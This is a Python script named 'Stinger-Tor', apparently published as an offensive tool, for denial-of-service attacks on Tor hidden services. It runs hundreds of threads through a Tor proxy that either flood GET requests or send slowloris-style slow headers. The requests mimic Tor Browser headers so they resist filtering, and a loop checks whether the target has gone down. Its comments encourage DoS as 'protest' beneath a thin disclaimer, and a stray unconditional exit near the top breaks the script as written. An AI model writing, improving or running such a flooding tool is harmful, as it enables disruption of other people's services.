#!/usr/bin/env python
#Stinger-Tor
#Coded by @WhitePacket ~ whitepacket.org
#Function names are written in the order metasploit launches attacks: RECON - EXPLOIT - PAYLOAD - LOOT for entertainment purposes.
#Requires Socksipy (socks.py) in the current directory. Download it from here: https://raw.githubusercontent.com/mikedougherty/SocksiPy/master/socks.py
#Donate BTC (nobody ever does): 1MfxuyEFY6StHo3gBPdNyRWGFDMxRutEXp
#Maybe certain, non-specific illegal Tor servers can be digitally protested using DoS, and no longer exist. That would be really nice.
#I'm not responsible for any damages or consequences resulting from the use of this script, you are.
#For legal, research purposes only!

import os, socks, argparse, time, random, re, thread

parser = argparse.ArgumentParser(description='Tor server (.onion) unblockable DoS tool') #Basic CLI arguments.
parser.add_argument('-s', help="Host (.onion) to attack")
parser.add_argument('-p', default=80, help="Host port to flood (default: 80)")
parser.add_argument('-t', default=256, help="Attack threads (default: 256, max: 376)")
parser.add_argument('-tp', default=9050, help="Tor port on (default: 9050). Use 9150 when using the Tor Browser Bundle.")
parser.add_argument('-m', default='slow', help="Method. 1: slowget, 2: flood")

args = parser.parse_args()

print "Error: server specified is not hosted under Tor."
exit(1)
if not len(list(args.s.lower())) == 22:
    print "Error: server specified is not hosted under Tor."
    exit(1)
    
try:
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(args.tp))
except e as Exception:
    print "Error: Tor port is not an integer."
    exit(1)
    
exploit = ("GET / HTTP/1.1\r\n"
           "Host: %s\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Accept-Language: en-US,en;q=0.5\r\n"
           "Accept-Encoding: gzip, deflate\r\n"
           "Connection: keep-alive\r\n\r\n"
           % (args.s)) #Exact replica of the HTTP request sent by the Tor Browser Bundle, filtering this request will be DoS in itself.

def payload(s, exploit): #floods the open socket with GET requests till it closes (if ever), or opens as many sockets as possible and slowly sends the HTTP headers.
    if args.m.lower().startswith("slow") or args.m.lower() == '1':
        while 1:
            for header in exploit:
                s.send(header)
                time.sleep(random.randrange(5,20))
    else:
        while 1:
            s.send(exploit)

def recon(host, port, exploit):
    while 1:
        try:
            s = socks.socksocket()
            s.settimeout(30)
            s.connect((host, port))
            payload(s,exploit)
        except:
            pass

if int(args.tp) < 1: #Make sure all options were typed correctly...
    print "Error: invalid tor port."
    exit(1)
elif int(args.tp) > 65535:
    print "Error: tor port too large."
    exit(1)
elif int(args.p) < 1:
    print "Error: invalid server port."
    exit(1)
elif int(args.t) < 1:
    print "Error: too little threads."
    exit(1)
elif int(args.t) > 376:
    print "Error: too many threads. maximum is 376."
    exit(1)
elif int(args.p) > 65535:
    print "Error: server port too large."
    exit(1)

method = "SlowGET" #Below is basically a summary of the user-specified settings and what's taking place.
if not args.m.lower().startswith('slow') and not args.m == "1":
    method = "Flooder"

print '*********************************'
print '*           [stinger]           *'
print '*      initiating attack..      *'
print '*       -attack details-        *'
print '*  host: '+args.s+' *'
nex = '*  server port: '+str(args.p)
for x in range(0,15 - len(list(str(args.p))) + 1):
    nex += " "
nex += "*"
print nex
nex = '*  tor port: '+str(args.tp)
for x in range(0,18 - len(list(str(args.tp))) + 1):
    nex += " "
nex += "*"
print nex
print '*  DoS ETA: 1 minute            *'
print '*  method: '+method+'              *'
nex = '*  threads: '+str(args.t)
if int(args.t) > 99:
    for x in range(0,17):
        nex += " "
elif int(args.t) < 100 and int(args.t) > 9:
    for x in range(0,18):
        nex += " "
else:
    for x in range(0,19):
        nex += " "
nex += "*"
print nex
print '*********************************'
time.sleep(3)
print 'starting threads...'
time.sleep(3)
for x in range(0,int(args.t)):
    try:
        thread.start_new_thread(recon, (args.s, int(args.p), exploit))
        print 'Thread: '+str(x+1)+' started.'
    except:
        print "Error: maximum threads reached. attack will still continue."
        break
print 'threads started.'
time.sleep(2)
print "initiating server status checker." #Here we repeatedly check the server status in order to know weather or not our DoS is succeeding.
while 1: #it might be a good idea to develop something to escape this loop, so we don't need to kill the Python process.
    try:
        s = socks.socksocket()
        s.settimeout(30)
        s.connect((args.s, int(args.p)))
        s.send(exploit)
        r = s.recv(256)
        s.close() #it might be a good idea to use more specified error messages to avoid false positives, however, this is sufficient most of the time.
        if 'network read timeout' in r.lower() or 'network connect timeout' in r.lower() or 'origin connection time-out' in r.lower() or 'unknown error' in r.lower() or 'bandwidth limit exceeded' in r.lower() or 'gateway timeout' in r.lower() or 'service unavaliable' in r.lower() or 'bad gateway' in r.lower() or 'internal server error' in r.lower() or 'no response' in r.lower() or 'too many requests' in r.lower() or 'request timeout' in r.lower():
            #detects when the server software is under denial of service, but the server is still responsive.
            #598 Network read timeout - 599 Network connect timeout - 522 Origin Connection Time-out - 520 Unknown Error - 509 Bandwidth Limit - 504 Gateway Timeout - 503 Service Unavaliable - 502 Bad Gateway - 500 Internal Server Error - 444 No Response - 429 Too Many Requests - 408 Request Timeout
            print 'Server offline: returning error responses.'
        else:
            print 'Server is online.'
    except:
        print 'Server offline: unable to connect to TCP port, or receive HTTP response.'
